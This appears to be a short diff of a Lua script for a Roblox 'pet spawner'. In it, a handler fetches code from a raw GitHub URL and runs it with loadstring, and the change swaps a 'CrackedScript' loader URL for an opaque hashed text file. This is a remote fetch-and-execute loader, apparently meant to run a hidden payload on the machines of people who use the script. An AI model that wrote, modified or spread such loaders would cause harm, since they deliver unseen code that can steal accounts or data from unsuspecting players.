@@ -509,7 +509,7 @@ local function handler()
 	TweenInfoOfSlide.Completed:Wait()
 	task.spawn(function()
 		local success, err = pcall(function()
-			loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLagHub-PetSpawner/CrackedScript-V1/refs/heads/main/Loader.lua"))()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLagHub-PetSpawner/Handler/refs/heads/main/52d2c6bdf15bdd207846bc83b3cb99e6.txt"))()
 		end)
 		loadSuccess = success
 		loadError = err
